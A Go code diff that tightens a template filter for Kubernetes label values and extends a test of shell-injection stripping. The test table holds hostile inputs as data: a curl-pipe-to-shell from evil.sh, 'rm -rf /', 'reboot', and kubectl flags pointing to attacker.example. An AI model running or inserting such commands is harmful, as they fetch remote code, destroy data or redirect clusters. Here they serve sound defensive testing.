@@ -13,7 +13,7 @@ import (
 // length-capped before it lands in a copy-paste shell fence. Kept here
 // so the pinning tests read cleanly instead of repeating the filter.
 func labelDirective(name string) string {
-	return "{{ .Labels." + name + ` | reReplaceAll "[^a-zA-Z0-9._:/-]" "" | printf "%.128s" }}`
+	return "{{ .Labels." + name + ` | reReplaceAll "[^a-zA-Z0-9._:/-]" "" | reReplaceAll "^-+" "" | printf "%.128s" }}`
 }
 
 // TestExtractQuickDiagnostics drives the markdown parser against the
@@ -190,6 +190,8 @@ func TestSubstitutedPlaceholderStripsShellInjection(t *testing.T) {
 		{"command substitution", "$(curl evil.sh|sh)", "kubectl describe node curlevil.shsh"},
 		{"backtick substitution", "`reboot`", "kubectl describe node reboot"},
 		{"semicolon chaining", "n1; rm -rf /", "kubectl describe node n1rm-rf/"},
+		{"kubectl server flag", "-shttps://attacker.example", "kubectl describe node shttps://attacker.example"},
+		{"flag hidden behind stripped space", " --server=x", "kubectl describe node serverx"},
 		{"benign hostname preserved", "web-01.prod.svc:8080", "kubectl describe node web-01.prod.svc:8080"},
 	}
 	for _, tc := range cases {
